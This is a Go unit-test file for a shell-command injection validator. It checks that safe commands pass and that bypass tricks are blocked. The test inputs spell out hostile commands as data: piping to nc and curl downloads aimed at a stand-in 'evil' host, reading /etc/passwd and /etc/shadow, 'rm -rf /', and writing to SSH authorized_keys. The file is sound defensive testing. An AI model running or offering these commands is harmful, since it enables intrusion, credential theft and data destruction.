package safeguard

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestValidateInjection_SafeCommands(t *testing.T) {
	t.Parallel()
	safe := []string{
		"ls -la",
		"git status",
		"go build ./...",
		"echo 'hello world'",
		"cat file.txt | grep pattern",
		"find . -name '*.go' -type f",
		"echo \"hello $USER\"",
		"go test -race ./... 2>&1 | tail -50",
		"cd /tmp && ls",
		"mkdir -p foo/bar/baz",
		"echo '{a,b,c}'",        // brace expansion in single quotes is literal
		"echo 'hello $(world)'", // command substitution in single quotes is literal
	}
	for _, cmd := range safe {
		t.Run(cmd, func(t *testing.T) {
			t.Parallel()
			assert.NoError(t, ValidateInjection(cmd))
		})
	}
}

func TestHasControlCharacters(t *testing.T) {
	t.Parallel()

	t.Run("normal whitespace allowed", func(t *testing.T) {
		t.Parallel()
		assert.False(t, hasControlCharacters("hello\tworld\n"))
	})

	t.Run("null byte blocked", func(t *testing.T) {
		t.Parallel()
		assert.True(t, hasControlCharacters("hello\x00world"))
	})

	t.Run("bell blocked", func(t *testing.T) {
		t.Parallel()
		assert.True(t, hasControlCharacters("hello\x07world"))
	})

	t.Run("escape blocked", func(t *testing.T) {
		t.Parallel()
		assert.True(t, hasControlCharacters("hello\x1bworld"))
	})

	t.Run("carriage return allowed", func(t *testing.T) {
		t.Parallel()
		assert.False(t, hasControlCharacters("hello\r\nworld"))
	})
}

func TestHasCommandSubstitution(t *testing.T) {
	t.Parallel()

	t.Run("dollar-paren blocked", func(t *testing.T) {
		t.Parallel()
		assert.True(t, hasCommandSubstitution("echo $(whoami)"))
	})

	t.Run("backtick blocked", func(t *testing.T) {
		t.Parallel()
		assert.True(t, hasCommandSubstitution("echo `whoami`"))
	})

	t.Run("single-quoted dollar-paren safe", func(t *testing.T) {
		t.Parallel()
		assert.False(t, hasCommandSubstitution("echo '$(whoami)'"))
	})

	t.Run("no substitution", func(t *testing.T) {
		t.Parallel()
		assert.False(t, hasCommandSubstitution("echo hello"))
	})
}

func TestHasIFSInjection(t *testing.T) {
	t.Parallel()

	t.Run("bare IFS", func(t *testing.T) {
		t.Parallel()
		assert.True(t, hasIFSInjection("cat$IFS/etc/passwd"))
	})

	t.Run("braced IFS", func(t *testing.T) {
		t.Parallel()
		assert.True(t, hasIFSInjection("cat${IFS}/etc/passwd"))
	})

	t.Run("single-quoted IFS safe", func(t *testing.T) {
		t.Parallel()
		assert.False(t, hasIFSInjection("echo '$IFS'"))
	})

	t.Run("no IFS", func(t *testing.T) {
		t.Parallel()
		assert.False(t, hasIFSInjection("echo hello"))
	})
}

func TestHasDangerousBraceExpansion(t *testing.T) {
	t.Parallel()

	t.Run("rm in braces blocked", func(t *testing.T) {
		t.Parallel()
		assert.True(t, hasDangerousBraceExpansion("{rm,-rf,/}"))
	})

	t.Run("curl in braces blocked", func(t *testing.T) {
		t.Parallel()
		assert.True(t, hasDangerousBraceExpansion("{curl,-o,/tmp/x,http://evil}"))
	})

	t.Run("safe brace expansion", func(t *testing.T) {
		t.Parallel()
		assert.False(t, hasDangerousBraceExpansion("echo {a,b,c}"))
	})

	t.Run("single-quoted braces safe", func(t *testing.T) {
		t.Parallel()
		assert.False(t, hasDangerousBraceExpansion("echo '{rm,-rf}'"))
	})

	t.Run("force flag in braces blocked", func(t *testing.T) {
		t.Parallel()
		assert.True(t, hasDangerousBraceExpansion("{git,push,--force}"))
	})
}

func TestHasProcessSubstitution(t *testing.T) {
	t.Parallel()

	t.Run("input process sub blocked", func(t *testing.T) {
		t.Parallel()
		assert.True(t, hasProcessSubstitution("diff <(cat /etc/passwd) file"))
	})

	t.Run("output process sub blocked", func(t *testing.T) {
		t.Parallel()
		assert.True(t, hasProcessSubstitution("tee >(nc evil 1234)"))
	})

	t.Run("single-quoted safe", func(t *testing.T) {
		t.Parallel()
		assert.False(t, hasProcessSubstitution("echo '<(hello)'"))
	})

	t.Run("normal redirect safe", func(t *testing.T) {
		t.Parallel()
		assert.False(t, hasProcessSubstitution("echo hello > file.txt"))
	})
}

func TestHasBackslashOperators(t *testing.T) {
	t.Parallel()

	t.Run("backslash semicolon blocked", func(t *testing.T) {
		t.Parallel()
		assert.True(t, hasBackslashOperators(`cat safe.txt \; rm -rf /`))
	})

	t.Run("backslash pipe blocked", func(t *testing.T) {
		t.Parallel()
		assert.True(t, hasBackslashOperators(`echo hello \| sh`))
	})

	t.Run("backslash ampersand blocked", func(t *testing.T) {
		t.Parallel()
		assert.True(t, hasBackslashOperators(`echo a \& rm -rf /`))
	})

	t.Run("single-quoted safe", func(t *testing.T) {
		t.Parallel()
		assert.False(t, hasBackslashOperators(`echo '\;'`))
	})

	t.Run("double-quoted safe", func(t *testing.T) {
		t.Parallel()
		assert.False(t, hasBackslashOperators(`echo "\;""`))
	})

	t.Run("normal pipe safe", func(t *testing.T) {
		t.Parallel()
		assert.False(t, hasBackslashOperators("echo hello | grep h"))
	})
}

func TestHasVariableRedirect(t *testing.T) {
	t.Parallel()

	t.Run("var before redirect blocked", func(t *testing.T) {
		t.Parallel()
		assert.True(t, hasVariableRedirect("echo x > $HOME/.bashrc"))
	})

	t.Run("braced var before redirect blocked", func(t *testing.T) {
		t.Parallel()
		assert.True(t, hasVariableRedirect("echo x > ${HOME}/.bashrc"))
	})

	t.Run("var after redirect blocked", func(t *testing.T) {
		t.Parallel()
		assert.True(t, hasVariableRedirect("$VAR > /etc/config"))
	})

	t.Run("single-quoted safe", func(t *testing.T) {
		t.Parallel()
		assert.False(t, hasVariableRedirect("echo '$HOME > file'"))
	})

	t.Run("literal redirect safe", func(t *testing.T) {
		t.Parallel()
		assert.False(t, hasVariableRedirect("echo hello > /tmp/out.txt"))
	})
}

func TestStripSingleQuotes(t *testing.T) {
	t.Parallel()

	t.Run("removes quoted content", func(t *testing.T) {
		t.Parallel()
		assert.Equal(t, "echo ", stripSingleQuotes("echo 'hello'"))
	})

	t.Run("preserves unquoted content", func(t *testing.T) {
		t.Parallel()
		assert.Equal(t, "hello world", stripSingleQuotes("hello world"))
	})

	t.Run("multiple quoted segments", func(t *testing.T) {
		t.Parallel()
		assert.Equal(t, "echo  and ", stripSingleQuotes("echo 'a' and 'b'"))
	})
}

func TestStripDoubleQuotes(t *testing.T) {
	t.Parallel()

	t.Run("removes quoted content", func(t *testing.T) {
		t.Parallel()
		assert.Equal(t, "echo ", stripDoubleQuotes(`echo "hello"`))
	})

	t.Run("handles escaped quotes", func(t *testing.T) {
		t.Parallel()
		// Inside double quotes, \" is an escaped quote — the content between the outer quotes is removed
		assert.Equal(t, "echo ", stripDoubleQuotes(`echo "hello \"world\""`))
	})
}

func TestValidateInjection_Integration(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		cmd     string
		blocked bool
		reason  string
	}{
		{"safe ls", "ls -la", false, ""},
		{"safe git", "git log --oneline -10", false, ""},
		{"command substitution", "echo $(cat /etc/shadow)", true, "command-substitution"},
		{"IFS bypass", "cat$IFS/etc/passwd", true, "ifs-injection"},
		{"brace rm", "{rm,-rf,/}", true, "brace-expansion"},
		{"process sub", "diff <(cat /etc/passwd) /dev/null", true, "process-substitution"},
		{"backslash semicolon", `cat x \; rm -rf /`, true, "backslash-operators"},
		{"var redirect", "echo x > $HOME/.ssh/authorized_keys", true, "variable-redirect"},
		{"null byte", "echo \x00hello", true, "control-characters"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := ValidateInjection(tt.cmd)
			if tt.blocked {
				assert.Error(t, err)
				assert.Contains(t, err.Error(), tt.reason)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}
